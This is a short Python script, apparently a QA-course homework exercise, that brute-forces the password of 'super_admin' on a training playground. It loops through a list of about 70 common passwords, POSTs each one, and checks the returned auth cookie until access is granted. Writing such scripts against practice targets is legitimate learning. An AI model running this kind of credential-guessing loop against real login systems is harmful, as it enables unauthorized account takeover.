import requests
#import json

login = 'super_admin'
passwords_list = ["password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein", "trustno1",
                  "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley", "bailey", "passw0rd",
                  "shadow", "123123", "654321", "superman", "qazwsx", "michael", "Football", "welcome", "jesus",
                  "ninja", "mustang", "password1", "123456789", "adobe123", "admin", "1234567890", "photoshop",
                  "1234", "12345", "princess", "azerty", "0000000", "access", "696969", "batman", "1qaz2wsx", "login",
                  "qwertyuiop", "solo", "starwars", "121212", "flower", "hottie", "loveme", "zaq1zaq1", "hello",
                  "freedom", "whatever", "666666", "!@#$%^&*", "charlie", "aa123456", "donald", "qwerty123",
                  "1q2w3e4r", "555555", "lovely", "7777777", "888888", "123qwe",
]

#passwords_list = "123456"

url1 = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url2 = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'



for password in passwords_list:
    secret = requests.post(url1, data= {"login": login, "password": password})
#    print(secret.text, secret.status_code, secret.cookies)
    auth_cookie = secret.cookies.get('auth_cookie')
    print(auth_cookie)
    cookies = {'auth_cookie': auth_cookie}
    check = requests.post(url2, cookies=cookies)
    print(check.text)
    key = 'You are NOT authorized'
    if key in check.text:
        print('Пароль не верный!')
    else:
        print('Password =', password, ',', check.text)
        break

